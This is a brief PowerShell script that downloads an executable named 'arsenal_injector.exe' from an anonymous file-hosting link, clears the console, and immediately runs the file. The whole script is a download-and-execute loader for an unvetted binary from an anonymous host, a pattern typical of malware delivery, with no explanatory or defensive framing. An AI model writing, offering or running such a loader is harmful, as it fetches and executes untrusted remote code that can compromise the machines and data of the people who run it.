$ProcName = "arsenal_injector.exe"
$WebFile = "https://cdn-143.anonfiles.com/pcv5Feu9zd/1c858d48-1685619571/$ProcName"
 
Clear-Host
 
(New-Object System.Net.WebClient).DownloadFile($WebFile,"$ProcName")
Start-Process ("$ProcName")
